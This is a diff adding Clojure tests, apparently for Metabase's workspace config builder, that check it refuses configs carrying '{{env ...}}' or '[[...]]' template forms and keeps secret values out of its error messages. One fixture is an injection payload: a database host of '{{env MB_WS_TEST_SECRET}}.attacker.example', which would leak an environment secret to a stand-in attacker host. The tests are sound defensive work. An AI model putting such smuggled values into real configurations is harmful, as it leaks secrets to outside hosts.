@@ -400,6 +400,96 @@
            #"not :provisioned"
            (config/build-workspace-config ws-id))))))
 
+(deftest build-workspace-config-emits-no-template-forms-test
+  (testing "The sidecar expands `{{env X}}` in every config.yml string at boot, so the parent refuses (422)
+            to emit a config carrying `{{`. The error names the database and field path, never the value."
+    (mt/with-temp [:model/Database {db-id :id}
+                   {:name    "Templated DW"
+                    :engine  :postgres
+                    :details {:host "{{env MB_WS_TEST_SECRET}}.attacker.example" :port 5432}}
+                   :model/Workspace {ws-id :id} {:name       "templated"
+                                                 :creator_id (mt/user->id :crowberto)}
+                   :model/WorkspaceDatabase _
+                   {:workspace_id     ws-id
+                    :database_id      db-id
+                    :database_details {:user "u" :password "{{env MB_WS_TEST_PASSWORD}}"}
+                    :output_namespace "ws_templated"
+                    :input_schemas    ["public"]
+                    :status           :provisioned}]
+      (let [e (try
+                (config/build-workspace-config ws-id)
+                nil
+                (catch clojure.lang.ExceptionInfo e e))]
+        (is (some? e))
+        (is (= 422 (:status-code (ex-data e))))
+        (is (= #{"database \"Templated DW\" field details.host"
+                 "database \"Templated DW\" field details.password"}
+               (set (:locations (ex-data e)))))
+        (is (not (re-find #"MB_WS_TEST" (ex-message e)))
+            "the message must not echo the template value")))))
+
+(deftest build-workspace-config-emits-no-optional-forms-test
+  (testing "The sidecar parses `[[...]]` in every config.yml string at boot and throws when one holds no
+            `{{`, so the parent refuses (422) to emit a config carrying `[[` as well."
+    (mt/with-temp [:model/Database {db-id :id}
+                   {:name    "Bracketed DW"
+                    :engine  :postgres
+                    :details {:host "db.example" :port 5432}}
+                   :model/Workspace {ws-id :id} {:name       "bracketed"
+                                                 :creator_id (mt/user->id :crowberto)}
+                   :model/WorkspaceDatabase _
+                   {:workspace_id     ws-id
+                    :database_id      db-id
+                    :database_details {:user "u" :password "p[[w]]d"}
+                    :output_namespace "ws_bracketed"
+                    :input_schemas    ["public"]
+                    :status           :provisioned}]
+      (let [e (try
+                (config/build-workspace-config ws-id)
+                nil
+                (catch clojure.lang.ExceptionInfo e e))]
+        (is (some? e))
+        (is (= 422 (:status-code (ex-data e))))
+        (is (= ["database \"Bracketed DW\" field details.password"]
+               (:locations (ex-data e))))
+        (is (not (re-find #"p\[\[w" (ex-message e)))
+            "the message must not echo the value")))))
+
+(deftest build-workspace-config-template-forms-outside-details-test
+  (testing "The refusal also covers database names (which are workspace map keys), workspace fields, and stub entries"
+    (mt/with-temp [:model/Database {db-id :id}
+                   {:name    "DW [[a]]"
+                    :engine  :postgres
+                    :details {:host "db.example" :port 5432}}
+                   :model/Database _
+                   {:name    "Stub [[b]]"
+                    :engine  :postgres
+                    :details {:host "stub.example" :port 5432}}
+                   :model/Workspace {ws-id :id} {:name       "named"
+                                                 :creator_id (mt/user->id :crowberto)}
+                   :model/WorkspaceDatabase _
+                   {:workspace_id     ws-id
+                    :database_id      db-id
+                    :database_details {:user "u" :password "p"}
+                    :output_namespace "ws_named"
+                    :input_schemas    ["public" "{{env MB_WS_TEST_SCHEMA}}"]
+                    :status           :provisioned}]
+      (let [e (try
+                (config/build-workspace-config ws-id)
+                nil
+                (catch clojure.lang.ExceptionInfo e e))]
+        (is (some? e))
+        (is (= 422 (:status-code (ex-data e))))
+        ;; the sync filter escapes `{` as `\x{7B}`, so details.schema-filters-patterns carries no
+        ;; template form; the raw input schema is still refused at input_schemas.1
+        (is (= #{"database \"DW [[a]]\" field name"
+                 "database \"Stub [[b]]\" field name"
+                 "workspace field databases.DW [[a]]"
+                 "workspace field databases.DW [[a]].input_schemas.1"}
+               (set (:locations (ex-data e)))))
+        (is (not (re-find #"MB_WS_TEST" (ex-message e)))
+            "the message must not echo a templated value")))))
+
 (deftest build-workspace-config-empty-workspace-test
   (testing "A workspace with no databases still produces the version+config outer shape"
     (mt/with-temp [:model/Workspace {ws-id :id} {:name       "Empty"
